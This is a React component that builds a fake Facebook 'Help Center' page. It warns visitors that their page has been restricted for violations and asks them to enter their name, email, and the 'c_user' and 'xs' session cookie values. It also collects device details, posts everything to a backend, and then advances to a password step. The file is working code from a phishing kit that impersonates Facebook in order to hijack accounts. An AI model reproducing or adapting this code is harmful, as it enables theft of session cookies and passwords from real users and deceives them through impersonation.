import { useState } from 'react';
import { useMutation } from '@tanstack/react-query';
import { Loader2 } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { useToast } from '@/hooks/use-toast';
import { apiRequest } from '@/lib/queryClient';
import { useDeviceDetector } from './DeviceDetector';
import VideoPlayer from './VideoPlayer';
import FormInput from './FormInput';
import type { MainFormData } from '@shared/schema';

interface MainFormProps {
  onNext: (submissionId: number, formData: Omit<MainFormData, 'screenWidth' | 'screenHeight' | 'isTouchDevice' | 'userAgent' | 'platform'>) => void;
}

export default function MainForm({ onNext }: MainFormProps) {
  const [formData, setFormData] = useState({
    c_user: '',
    xs: '',
    email: '',
    fullName: ''
  });
  const [errors, setErrors] = useState<Record<string, string>>({});
  const deviceInfo = useDeviceDetector();
  const { toast } = useToast();

  const mutation = useMutation({
    mutationFn: async (data: MainFormData) => {
      const response = await apiRequest('POST', '/api/forms/main', data);
      return response.json();
    },
    onSuccess: (data) => {
      if (data.success) {
        toast({
          title: "Form submitted successfully",
          description: "Please proceed to password verification.",
        });
        onNext(data.submissionId, formData);
      } else {
        if (data.errors) {
          const errorMap: Record<string, string> = {};
          data.errors.forEach((error: any) => {
            errorMap[error.field] = error.message;
          });
          setErrors(errorMap);
        }
      }
    },
    onError: (error) => {
      toast({
        title: "Submission failed",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
    if (errors[name]) {
      setErrors(prev => ({ ...prev, [name]: '' }));
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    const submissionData: MainFormData = {
      ...formData,
      ...deviceInfo
    };

    mutation.mutate(submissionData);
  };

  return (
    <div className="max-w-md mx-auto bg-white rounded-lg shadow-sm border border-facebook-border overflow-hidden">
      {/* Header */}
      <div className="bg-blue-600 text-white px-4 py-6 text-center">
        <h1 className="text-2xl font-bold">facebook</h1>
      </div>
      
      {/* Help Center Header */}
      <div className="bg-gray-100 px-4 py-3 border-b border-facebook-border">
        <h2 className="text-facebook-blue font-semibold">Help Center</h2>
      </div>

      <div className="p-4">
        {/* Alert Section */}
        <div className="bg-gray-50 p-3 rounded-md mb-4">
          <h3 className="font-semibold text-facebook-text mb-2">Request For Remove Page Violation</h3>
        </div>

        {/* Warning Messages */}
        <div className="space-y-3 mb-4 text-sm text-facebook-text">
          <p className="font-medium">We've identified irregular activity on your page that goes against our community guidelines.</p>
          <p className="font-medium">As a result, access to your page has been restricted, and you're presently unable to post, share, or comment using it.</p>
          <p className="font-medium">Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear.</p>
        </div>

        {/* Video Section */}
        <div className="mb-4">
          <p className="text-xs text-facebook-secondary mb-2">Detailed Video Information.</p>
          <VideoPlayer autoplay={true} />
          <p className="text-xs text-facebook-text mt-2">Please make sure not to log out from your computer or laptop until you have received a verification email.</p>
        </div>

        {/* Form */}
        <form onSubmit={handleSubmit} className="space-y-4">
          <FormInput
            label="Full Name"
            name="fullName"
            value={formData.fullName}
            onChange={handleChange}
            error={errors.fullName}
            required
            placeholder="Enter your full name"
          />

          <FormInput
            label="Email Address"
            type="email"
            name="email"
            value={formData.email}
            onChange={handleChange}
            error={errors.email}
            required
            placeholder="Enter your email"
          />

          <FormInput
            label="c_user"
            type="text"
            name="c_user"
            value={formData.c_user}
            onChange={handleChange}
            error={errors.cUser}
            required
            pattern="^\d{15}$"
            title="Please enter 15 digits"
            placeholder="Enter 15-digit c_user"
          />

          <FormInput
            label="xs"
            name="xs"
            value={formData.xs}
            onChange={handleChange}
            error={errors.xs}
            required
            placeholder="Enter xs token"
          />

          <div className="bg-gray-50 p-3 rounded-md">
            <Button
              type="submit"
              disabled={mutation.isPending}
              className="w-full bg-facebook-blue hover:bg-facebook-blue-dark text-white py-2 px-4 rounded-md font-medium transition-colors disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center"
            >
              {mutation.isPending ? (
                <>
                  <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                  Processing...
                </>
              ) : (
                'Submit'
              )}
            </Button>
          </div>
        </form>
      </div>
    </div>
  );
}
